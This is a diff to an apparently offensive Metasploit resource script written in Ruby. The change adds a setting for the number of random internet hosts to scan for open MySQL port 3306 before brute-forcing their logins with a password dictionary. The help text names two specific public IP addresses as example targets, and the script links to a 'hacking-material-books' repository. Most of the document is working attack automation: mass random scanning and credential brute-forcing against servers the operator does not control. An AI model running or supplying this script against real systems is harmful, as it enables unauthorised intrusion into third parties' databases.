@@ -1,6 +1,7 @@
    <ruby>
       help = %Q|
         Description:
+          setg RANDOM 1000 - Limit number of random rhosts to search
           setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 3306 open
           setg RHOSTS 212.8.247.171 213.171.197.190 - To instruct db_nmap to check targets for port 3306 open
           setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
@@ -9,6 +10,7 @@
           if none value (setg) has povided then this resource script will use is own default values.
 
         Execute in msfconsole:
+          setg RANDOM <number-of-rhosts>
           setg RANDOM_HOSTS <true-or-blank>
           setg RHOSTS <hosts-separated-by-spaces>
           setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
@@ -21,7 +23,13 @@
       Rex::sleep(2.0)
 
       if (framework.datastore['RANDOM_HOSTS'] == 'true')
-         print_line("RHOSTS => nmap -sV -Pn -T4 -O -iR 1000 -p 3306 --script=mysql-info.nse --open")
+         if (framework.datastore['RANDOM'] == nil or framework.datastore['RANDOM'] == '')
+           run_single("setg RANDOM 800")
+           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['RANDOM']} -p 3306 --open --script=mysql-info.nse")
+         else
+           print_line("RANDOM => #{framework.datastore['RANDOM']}")
+           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['RANDOM']} -p 3306 --open --script=mysql-info.nse")
+         end
       elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
          run_single("setg RHOSTS 192.168.1.0/24")
       elsif (framework.datastore['RHOSTS'])
@@ -34,7 +42,7 @@
          run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse --open #{framework.datastore['RHOSTS']}")
       else
          print_warning("db_nmap: search for random remote targets with port 3306 open (mysql)")
-         run_single("db_nmap -sV -Pn -T4 -O -iR 1000 --script=mysql-info.nse -p 3306 --open")
+         run_single("db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['RANDOM']} --script=mysql-info.nse -p 3306 --open")
       end
 
       run_single("spool /root/mysql_brute.log")
@@ -50,7 +58,7 @@
               print_error("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               print_line("")
-              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
+              run_single("unsetg RHOSTS USERPASS_FILE RANDOM RANDOM_HOSTS")
               File.delete('/root/mysql_brute.log')
               return nil
          elsif xport.nil? or xport == ''
@@ -58,7 +66,7 @@
               print_error("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               print_line("")
-              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
+              run_single("unsetg RHOSTS USERPASS_FILE RANDOM RANDOM_HOSTS")
               run_single("services -d")
               run_single("hosts -d")
               File.delete('/root/mysql_brute.log')
@@ -94,9 +102,11 @@
        print_warning("Please wait, Cleaning msfdb Database.")
        Rex::sleep(1.0)
        print_line("")
-       run_single("unsetg RHOSTS RANDOM_HOSTS USERPASS_FILE")
+       run_single("unsetg RHOSTS RANDOM RANDOM_HOSTS USERPASS_FILE")
        run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
+       print_line("")
        run_single("services -d")
        run_single("hosts -d")
        print_warning("Logfile stored under: /root/mysql_brute.log")
+       print_status("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
 </ruby>
